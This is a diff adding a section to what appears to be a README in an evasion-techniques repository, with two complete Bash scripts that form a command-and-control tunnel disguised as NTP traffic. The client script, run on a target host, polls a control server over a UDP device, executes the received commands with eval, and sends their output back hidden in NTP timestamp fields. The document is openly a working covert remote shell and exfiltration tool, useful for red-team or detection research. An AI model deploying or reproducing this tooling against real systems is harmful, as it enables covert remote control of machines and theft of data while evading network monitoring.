@@ -1141,3 +1141,351 @@ Sender<br />
 
 Receiver<br />
 ![alt text](https://github.com/billchaison/evasion/blob/master/echo01.png)
+
+## >> Bash C2 Tunnel Through NTP
+
+These two scripts can be used to execute Bash shell commands through a command and control framework disguised as NTP.  Execute `ntp-c2-svr.sh` on the control server (IP address is 192.168.1.242 in this example).  Execute `ntp-c2-cli.sh` on the target host (IP address is 192.168.1.251 in this example).  The client script relies on Bash UDP devices so does not require netcat.
+
+**C2 server script**
+
+`ntp-c2-svr.sh`<br />
+```bash
+#!/usr/bin/bash
+
+struct_1="140204e800000293000004937f"
+flag=0
+recv=0
+c2_logs=$(mktemp)
+c2_poll=$(echo -n XPOL | xxd -p)
+c2_term=$(echo -n XEND | xxd -p)
+c2_sfin=$(echo -n X000 | xxd -p)
+c2_zero=$(echo -n XZRO | xxd -p)
+c2_cmdx=$(echo -n X | xxd -p)
+c2_pyld=$(echo -n XO | xxd -p)
+cmd_str=""
+dat_str=""
+
+function ntp_send {
+   org_time=$(echo $c2_data | rev | cut -c 1-16 | rev)
+   ref_time=$(echo $org_time | cut -c 1-8)
+   ref_time=$(printf "%08x" $((0x$ref_time - 2)))
+   ref_frac=$(dd if=/dev/urandom bs=4 count=1 2>/dev/null | xxd -p)
+   ref_time="$ref_time$ref_frac"
+   rcv_time=$(printf "%08x\n" $(a=`date -u +%s`; echo $(($a+2208988800))))
+   xmt_time=$rcv_time
+   rcv_frac=$(dd if=/dev/urandom bs=3 count=1 2>/dev/null | xxd -p)
+   rcv_time=$(printf "%s00%s" $rcv_time $rcv_frac)
+   if ! [[ "$c2_cmd" =~ ^[0-9]+$ ]]
+   then
+      xmt_frac=$(printf "%08x" $((0x$rcv_frac + 0x1337)))
+   else
+      :
+   fi
+   xmt_time="$xmt_time$xmt_frac"
+   echo -n "$struct_1$c2_cmd$ref_time$org_time$rcv_time$xmt_time" | xxd -r -p | timeout 0.1 nc -u -p 123 $c2_addr $c2_port >/dev/null 2>&1
+}
+
+while true
+do
+   c2_data=$(socat -dd - UDP4-RECVFROM:123 2>$c2_logs | base64 -w 0)
+   c2_peer=$(cat $c2_logs | grep "receiving packet from")
+   if [ $? -eq 0 ]
+   then
+      c2_peer=$(echo $c2_peer | rev | cut -d " " -f 1 | rev)
+      c2_addr=$(echo $c2_peer | cut -d ":" -f 1)
+      c2_port=$(echo $c2_peer | cut -d ":" -f 2)
+      c2_data=$(echo $c2_data | base64 -d | xxd -p -c 256)
+      if [ ${#c2_data} -eq 96 ]
+      then
+         c2_event=$(echo $c2_data | cut -c 25-32)
+         if [ "$c2_event" = "$c2_poll" ]
+         then
+            recv=0
+            dat_str=""
+            if [ ${#cmd_str} -eq 0 ]
+            then
+               c2_cmd=$(echo -n ACK | xxd -p)
+               if [ $flag -eq 0 ]
+               then
+                  flag=1
+                  echo "[+] C2 client poll received ($c2_addr)."
+                  echo "[+] Enter a command to execute on the remote host:"
+                  echo "[+] (Enter KILL to terminate the remote agent)"
+               else
+                  echo "[+] Enter a command to execute on the remote host:"
+               fi
+               ntp_send
+               read -r -p "> " cmd_str
+            else
+               if [ "$cmd_str" = "KILL" ]
+               then
+                  c2_cmd=$(echo -n BYE | xxd -p)
+                  ntp_send
+                  cmd_str=""
+               else
+                  cmd_hexarr=( $(echo -n $cmd_str | xxd -p | fold -w 8) )
+                  echo "[+] Sending command in ${#cmd_hexarr[@]} packets..."
+                  cmd_str=""
+                  for xmt_frac in "${cmd_hexarr[@]}"
+                  do
+                     cmd_part=$((${#xmt_frac}/2))
+                     c2_cmd=$(printf "%03d" $cmd_part | xxd -p)
+                     for x in $(seq $cmd_part 3)
+                     do
+                        xmt_frac=$xmt_frac"00"
+                     done
+                     ntp_send
+                     c2_data=$(socat -dd - UDP4-RECVFROM:123 2>$c2_logs | base64 -w 0)
+                     c2_peer=$(cat $c2_logs | grep "receiving packet from")
+                     if [ $? -eq 0 ]
+                     then
+                        c2_peer=$(echo $c2_peer | rev | cut -d " " -f 1 | rev)
+                        c2_addr=$(echo $c2_peer | cut -d ":" -f 1)
+                        c2_port=$(echo $c2_peer | cut -d ":" -f 2)
+                        c2_data=$(echo $c2_data | base64 -d | xxd -p -c 256)
+                        if [ ${#c2_data} -eq 96 ]
+                        then
+                           c2_event=$(echo $c2_data | cut -c 25-32)
+                           if [[ "$c2_event" =~ ^$c2_cmdx[0-9]+$ ]]
+                           then
+                              if [ "$c2_event" = "$c2_cmdx$c2_cmd" ]
+                              then
+                                 :
+                              else
+                                 echo "[-] Command processor length error $c2_cmd."
+                                 break
+                              fi
+                           else
+                              echo "[-] Command processor unexpected packet $c2_event."
+                              break
+                           fi
+                        else
+                           echo "[-] Command processor malformed packet."
+                           break
+                        fi
+                     else
+                        echo "[-] Command processor log parse error."
+                        break
+                     fi
+                  done
+                  c2_cmd=$(echo -n "000" | xxd -p)
+                  xmt_frac=$(dd if=/dev/urandom bs=4 count=1 2>/dev/null | xxd -p)
+                  ntp_send
+                  c2_data=$(socat -dd - UDP4-RECVFROM:123 2>$c2_logs | base64 -w 0)
+                  c2_peer=$(cat $c2_logs | grep "receiving packet from")
+                  if [ $? -eq 0 ]
+                  then
+                     c2_peer=$(echo $c2_peer | rev | cut -d " " -f 1 | rev)
+                     c2_addr=$(echo $c2_peer | cut -d ":" -f 1)
+                     c2_port=$(echo $c2_peer | cut -d ":" -f 2)
+                     c2_data=$(echo $c2_data | base64 -d | xxd -p -c 256)
+                     if [ ${#c2_data} -eq 96 ]
+                     then
+                        c2_event=$(echo $c2_data | cut -c 25-32)
+                        if [ "$c2_event" = "$c2_sfin" ]
+                        then
+                           echo "[+] Command received by remote host."
+                        else
+                           echo "[-] Command processor unexpected packet $c2_event."
+                        fi
+                     else
+                        echo "[-] Command processor malformed packet."
+                     fi
+                  else
+                     echo "[-] Command processor log parse error."
+                  fi
+               fi
+            fi
+         fi
+         if [ "$c2_event" = "$c2_term" ]
+         then
+            echo "[+] C2 client terminated."
+            break
+         fi
+         if [ "$c2_event" = "$c2_zero" ]
+         then
+            echo "[-] Command processor output file was empty."
+         fi
+         if [[ "$c2_event" =~ ^$c2_pyld[0-9]+$ ]]
+         then
+            if [ $recv -eq 0 ]
+            then
+               echo "[+] Receiving data from the remote host..."
+               recv=$(($recv+1))
+            fi
+            plen=$(printf "%d" $(echo -n $c2_event | cut -c 5-8 | xxd -r -p))
+            if [ $plen -eq 0 ]
+            then
+               echo $dat_str | xxd -r -p
+               dat_str=""
+            else
+               chunk=$(echo $c2_data | cut -c 89-96)
+               plen=$(($plen*2))
+               dat_str="$dat_str"$(echo -n $chunk | cut -c 1-$plen)
+            fi
+         fi
+      fi
+   else
+      echo "[-] Log parse error."
+   fi
+done
+```
+
+**C2 client script**
+
+`ntp-c2-cli.sh`<br />
+```bash
+#!/usr/bin/bash
+
+c2_server="192.168.1.242"
+c2_ntpdev="/dev/udp/$c2_server/123"
+c2_polint="4.5" # long polling interval
+c2_datint="1.0" # short data interval
+c2_idpoll=$(echo -n XPOL | xxd -p)
+c2_idterm=$(echo -n XEND | xxd -p)
+c2_idsfin=$(echo -n X000 | xxd -p)
+c2_idzero=$(echo -n XZRO | xxd -p)
+c2_rack=$(echo -n ACK | xxd -p)
+c2_rkill=$(echo -n BYE | xxd -p)
+c2_rfin=$(echo -n 000 | xxd -p)
+c2_command=""
+struct_1="d30004fa0001000000010000"
+struct_2="000000000000000000000000000000000000000000000000"
+flag=0
+cmd_str=""
+cmd_out=$(mktemp)
+while true
+do
+   delay=$c2_polint
+   xmt_time=$(printf "%08x\n" $(a=`date -u +%s`; echo $(($a+2208988800))))
+   xmt_mesg=$(dd if=/dev/urandom bs=4 count=1 2>/dev/null | xxd -p)
+   if [ ${#cmd_str} -eq 0 ]
+   then
+      c2_id=$c2_idpoll
+   fi
+   exec 5<>$c2_ntpdev
+   echo -n "$struct_1$c2_id$struct_2$xmt_time$xmt_mesg" | xxd -r -p >&5
+   c2_resp=$(timeout $c2_polint dd bs=4K count=1 <&5 2>/dev/null | xxd -p -c 256)
+   exec 5>&-
+   if [ ${#c2_resp} -eq 96 ]
+   then
+      c2_event=$(echo $c2_resp | cut -c 27-32)
+      if [ "$c2_event" = "$c2_rack" ]
+      then
+         if [ $flag -eq 0 ]
+         then
+            flag=1
+            echo "[+] C2 server acknowledgement received."
+         fi
+         cmd_str=""
+      fi
+      if [ "$c2_event" = "$c2_rkill" ]
+      then
+         echo "[+] C2 server kill command received."
+         sleep $c2_polint
+         xmt_time=$(printf "%08x\n" $(a=`date -u +%s`; echo $(($a+2208988800))))
+         xmt_mesg=$(dd if=/dev/urandom bs=4 count=1 2>/dev/null | xxd -p)
+         c2_id=$c2_idterm
+         exec 5<>$c2_ntpdev
+         echo -n "$struct_1$c2_id$struct_2$xmt_time$xmt_mesg" | xxd -r -p >&5
+         c2_resp=$(timeout $c2_polint dd bs=4K count=1 <&5 2>/dev/null | xxd -p -c 256)
+         exec 5>&-
+         rm -f $cmd_out
+         break
+      fi
+      if [[ "$c2_event" =~ ^[0-9]+$ ]]
+      then
+         if [ "$c2_event" = "$c2_rfin" ]
+         then
+            echo -n -e "[+] C2 command received.\n    "
+            cmd_eval=$(echo $cmd_str | xxd -r -p)
+            echo $cmd_eval
+            cmd_str=""
+            xmt_time=$(printf "%08x\n" $(a=`date -u +%s`; echo $(($a+2208988800))))
+            xmt_mesg=$(dd if=/dev/urandom bs=4 count=1 2>/dev/null | xxd -p)
+            c2_id=$c2_idsfin
+            delay=$c2_datint
+            sleep $delay
+            cat /dev/null >$cmd_out
+            eval $cmd_eval >$cmd_out 2>/dev/null
+            echo -n "$struct_1$c2_id$struct_2$xmt_time$xmt_mesg" | xxd -r -p >$c2_ntpdev
+            fsize=$(stat -c%s $cmd_out)
+            if [ "$fsize" = "0" ]
+            then
+               echo "[-] Command returned no output."
+               sleep $delay
+               xmt_time=$(printf "%08x\n" $(a=`date -u +%s`; echo $(($a+2208988800))))
+               xmt_mesg=$(dd if=/dev/urandom bs=4 count=1 2>/dev/null | xxd -p)
+               c2_id=$c2_idzero
+               echo -n "$struct_1$c2_id$struct_2$xmt_time$xmt_mesg" | xxd -r -p >$c2_ntpdev
+            else
+               sleep $delay
+               data_w=$(($fsize/4))
+               data_f=$(($fsize%4))
+               data_p=$data_w
+               if [ $data_f -gt 0 ]
+               then
+                  data_p=$(($data_p+1))
+               fi
+               #HERE
+               echo "[+] Sending "$(($data_p+1))" data packets to the server..."
+               fskip=0
+               for x in $(seq 1 $data_p)
+               do
+                  if [ $data_w -gt 0 ]
+                  then
+                     chunk=4
+                     data_w=$(($data_w-1))
+                  else
+                     chunk=$data_f
+                  fi
+                  payload=$(dd if=$cmd_out skip=$fskip bs=1 count=$chunk 2>/dev/null | xxd -p)
+                  plen=$((8-${#payload}))
+                  if [ $plen -gt 0 ]
+                  then
+                     fmt="%0$plen"d
+                     payload=$(printf "$payload$fmt" 0)
+                  fi
+                  fskip=$(($fskip+$chunk))
+                  c2_iddata=$(printf "XO%02d" $chunk | xxd -p)
+                  xmt_time=$(printf "%08x\n" $(a=`date -u +%s`; echo $(($a+2208988800))))
+                  xmt_mesg=$payload
+                  c2_id=$c2_iddata
+                  echo -n "$struct_1$c2_id$struct_2$xmt_time$xmt_mesg" | xxd -r -p >$c2_ntpdev
+                  sleep $delay
+               done
+               c2_iddata=$(echo -n XO00 | xxd -p)
+               payload="00000000"
+               xmt_time=$(printf "%08x\n" $(a=`date -u +%s`; echo $(($a+2208988800))))
+               xmt_mesg=$payload
+               c2_id=$c2_iddata
+               echo -n "$struct_1$c2_id$struct_2$xmt_time$xmt_mesg" | xxd -r -p >$c2_ntpdev
+               echo "[+] Send data to server completed."
+               sleep $c2_polint
+            fi
+         else
+            if [ ${#cmd_str} -eq 0 ]
+            then
+               echo "[+] C2 server is sending a command."
+            fi
+            c2_cmd=$(echo $c2_resp | cut -c 89-96)
+            cmd_len=$(echo -n $c2_event | xxd -r -p)
+            cmd_len=$(($cmd_len*2))
+            c2_cmd=$(echo $c2_cmd | cut -c 1-$cmd_len)
+            cmd_str="$cmd_str$c2_cmd"
+            c2_id=$(printf "%s%s" $(echo -n X | xxd -p) $c2_event)
+            delay=$c2_datint
+         fi
+      fi
+   fi
+   sleep $delay
+done
+```
+
+**Example screens**
+
+The server<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/ntp01.png)
+
+The client<br />
+![alt text](https://github.com/billchaison/evasion/blob/master/ntp02.png)
